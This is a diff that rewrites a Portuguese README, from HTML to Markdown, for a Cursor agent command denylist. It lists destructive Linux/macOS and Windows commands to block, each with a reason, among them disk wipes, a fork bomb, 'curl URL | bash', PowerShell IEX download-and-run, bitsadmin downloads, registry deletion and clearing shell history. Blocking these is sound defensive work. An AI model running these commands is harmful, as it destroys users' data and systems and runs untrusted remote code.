@@ -1,72 +1,58 @@
-<h1>Cursor Agent — Denylist Mortal</h1>
-<p>
-<strong>Passos:</strong><br>
-1. <em>Cursor → Settings → Features → Command denylist</em><br>
-2. Clique <kbd>Copiar</kbd> em cada linha abaixo e cole no painel.<br>
+# Cursor Agent — Denylist Mortal (README)
+
+## Como usar no Cursor
+
+1. **Cursor → Settings → Features → Command denylist**  
+2. Copie cada comando abaixo (botão “Copy” do GitHub) e cole no painel.  
 3. Salve.
-</p>
 
-> Todos os comandos abaixo são destrutivos (apagão de disco, formatação, download de malware, etc.).
+> **Por quê?** Todos são comandos destrutivos: apagam disco, formatam partição, baixam código não-verificado ou matam processos críticos.
 
-<hr/>
-
-<style>
-table{border-collapse:collapse;width:100%;max-width:960px;}
-th,td{border:1px solid #ddd;padding:6px;}
-th{background:#fafafa;text-align:left;}
-input{width:100%;font-family:monospace;border:none;background:#f5f5f5;}
-button{padding:4px 10px;margin-left:4px;cursor:pointer;}
-small{color:#666;}
-</style>
-<script>
-function cp(btn){navigator.clipboard.writeText(btn.previousElementSibling.value);}
-</script>
+---
 
 ## Linux / macOS
-<table>
-<thead><tr><th>Comando</th><th>Perigo</th></tr></thead>
-<tbody>
-<tr><td><input value="rm -rf /" readonly><button onclick="cp(this)">Copiar</button></td><td>Apaga todo o sistema.</td></tr>
-<tr><td><input value="sudo rm -rf /*" readonly><button onclick="cp(this)">Copiar</button></td><td>Idem, mas como root.</td></tr>
-<tr><td><input value="mv ~ /dev/null" readonly><button onclick="cp(this)">Copiar</button></td><td>Remove todo seu home.</td></tr>
-<tr><td><input value="dd if=/dev/random of=/dev/sda" readonly><button onclick="cp(this)">Copiar</button></td><td>Sobrescreve disco com lixo.</td></tr>
-<tr><td><input value=":(){ :|:& };:" readonly><button onclick="cp(this)">Copiar</button></td><td>Fork-bomb que trava o SO.</td></tr>
-<tr><td><input value="chmod -R 777 /" readonly><button onclick="cp(this)">Copiar</button></td><td>Remove segurança de permissões.</td></tr>
-<tr><td><input value="find / -type f -exec rm -f {} \\;" readonly><button onclick="cp(this)">Copiar</button></td><td>Exclui todos os arquivos.</td></tr>
-<tr><td><input value="mkfs.*" readonly><button onclick="cp(this)">Copiar</button></td><td>Formata partições.</td></tr>
-<tr><td><input value="kill -9 1" readonly><button onclick="cp(this)">Copiar</button></td><td>Mata init → crash.</td></tr>
-<tr><td><input value="killall5" readonly><button onclick="cp(this)">Copiar</button></td><td>Encerra processos críticos.</td></tr>
-<tr><td><input value="> ~/.bash_history" readonly><button onclick="cp(this)">Copiar</button></td><td>Apaga rastros.</td></tr>
-<tr><td><input value="wget URL -O - | bash" readonly><button onclick="cp(this)">Copiar</button></td><td>Executa código remoto.</td></tr>
-<tr><td><input value="curl URL | bash" readonly><button onclick="cp(this)">Copiar</button></td><td>Idem.</td></tr>
-<tr><td><input value="echo MAL > /etc/passwd" readonly><button onclick="cp(this)">Copiar</button></td><td>Corrompe usuários.</td></tr>
-<tr><td><input value="shutdown now" readonly><button onclick="cp(this)">Copiar</button></td><td>Desliga sem aviso.</td></tr>
-<tr><td><input value="reboot" readonly><button onclick="cp(this)">Copiar</button></td><td>Reinicia sem aviso.</td></tr>
-</tbody>
-</table>
+
+| Comando | Por que é perigoso |
+|---------|-------------------|
+| ```rm -rf /``` | Apaga todo o sistema. |
+| ```sudo rm -rf /*``` | Idem, mas como root. |
+| ```mv ~ /dev/null``` | Remove todo seu home. |
+| ```dd if=/dev/random of=/dev/sda``` | Sobrescreve o disco com lixo. |
+| ```:(){ :|:& };:``` | Fork-bomb que trava o SO. |
+| ```chmod -R 777 /``` | Remove segurança de permissões. |
+| ```find / -type f -exec rm -f {} \;``` | Exclui todos os arquivos. |
+| ```mkfs.*``` | Formata partições. |
+| ```kill -9 1``` | Mata o init e derruba o sistema. |
+| ```killall5``` | Encerra todos os processos. |
+| ```> ~/.bash_history``` | Apaga rastros. |
+| ```wget URL -O - \| bash``` | Executa código remoto não confiável. |
+| ```curl URL \| bash``` | Idem. |
+| ```echo MAL > /etc/passwd``` | Corrompe banco de usuários. |
+| ```shutdown now``` | Desliga sem aviso. |
+| ```reboot``` | Reinicia sem aviso. |
+
+---
 
 ## Windows
-<table>
-<thead><tr><th>Comando</th><th>Perigo</th></tr></thead>
-<tbody>
-<tr><td><input value="format C: /Q /Y" readonly><button onclick="cp(this)">Copiar</button></td><td>Formata drive C:.</td></tr>
-<tr><td><input value="del /f /s /q C:\\*" readonly><button onclick="cp(this)">Copiar</button></td><td>Apaga todos os arquivos.</td></tr>
-<tr><td><input value="rd /s /q C:\\" readonly><button onclick="cp(this)">Copiar</button></td><td>Remove diretórios raiz.</td></tr>
-<tr><td><input value="takeown /R /F C:\\" readonly><button onclick="cp(this)">Copiar</button></td><td>Quebra ACLs.</td></tr>
-<tr><td><input value="icacls C:\\ /grant Everyone:F /T" readonly><button onclick="cp(this)">Copiar</button></td><td>Permissão total a todos.</td></tr>
-<tr><td><input value="cipher /w:C" readonly><button onclick="cp(this)">Copiar</button></td><td>Wipe de disco.</td></tr>
-<tr><td><input value="reg delete HKLM /f" readonly><button onclick="cp(this)">Copiar</button></td><td>Remove hive crítico.</td></tr>
-<tr><td><input value="reg delete HKCU /f" readonly><button onclick="cp(this)">Copiar</button></td><td>Apaga perfil usuário.</td></tr>
-<tr><td><input value="reg delete HKCR\\.exe /f" readonly><button onclick="cp(this)">Copiar</button></td><td>Quebra .exe.</td></tr>
-<tr><td><input value="assoc .exe=" readonly><button onclick="cp(this)">Copiar</button></td><td>Desassocia executáveis.</td></tr>
-<tr><td><input value='powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (Invoke-WebRequest URL).Content"' readonly><button onclick="cp(this)">Copiar</button></td><td>Baixa/roda script malicioso.</td></tr>
-<tr><td><input value="bitsadmin /transfer badjob URL C:\\a.exe" readonly><button onclick="cp(this)">Copiar</button></td><td>Download furtivo via BITS.</td></tr>
-<tr><td><input value="diskpart /s %TEMP%\\wipe.txt" readonly><button onclick="cp(this)">Copiar</button></td><td>Diskpart wiping.</td></tr>
-<tr><td><input value="taskkill /F /IM svchost.exe" readonly><button onclick="cp(this)">Copiar</button></td><td>Mata serviços essenciais.</td></tr>
-<tr><td><input value="shutdown -s -t 0" readonly><button onclick="cp(this)">Copiar</button></td><td>Desliga imediato.</td></tr>
-<tr><td><input value="shutdown -r -t 0" readonly><button onclick="cp(this)">Copiar</button></td><td>Reinicia imediato.</td></tr>
-</tbody>
-</table>
 
-<hr/>
-<small>GitHub desativa JavaScript em Markdown renderizado. Abra este arquivo localmente ou publique via GitHub Pages para ativar os botões.</small>
+| Comando | Por que é perigoso |
+|---------|-------------------|
+| ```format C: /Q /Y``` | Formata drive C:. |
+| ```del /f /s /q C:\*``` | Apaga todos os arquivos. |
+| ```rd /s /q C:\``` | Remove diretórios recursivamente. |
+| ```takeown /R /F C:\``` | Toma posse de tudo (quebra ACL). |
+| ```icacls C:\ /grant Everyone:F /T``` | Concede acesso total a todos. |
+| ```cipher /w:C``` | Faz wipe do disco. |
+| ```reg delete HKLM /f``` | Remove hive crítico do Registro. |
+| ```reg delete HKCU /f``` | Apaga perfil do usuário. |
+| ```reg delete HKCR\.exe /f``` | Quebra associação de executáveis. |
+| ```assoc .exe=``` | Idem, via assoc. |
+| ```powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (Invoke-WebRequest URL).Content"``` | Executa script remoto malicioso. |
+| ```bitsadmin /transfer badjob URL C:\a.exe``` | Baixa malware usando BITS. |
+| ```diskpart /s %TEMP%\wipe.txt``` | Automatiza diskpart para limpar discos. |
+| ```taskkill /F /IM svchost.exe``` | Mata serviços essenciais. |
+| ```shutdown -s -t 0``` | Desliga imediatamente. |
+| ```shutdown -r -t 0``` | Reinicia imediatamente. |
+
+---
+
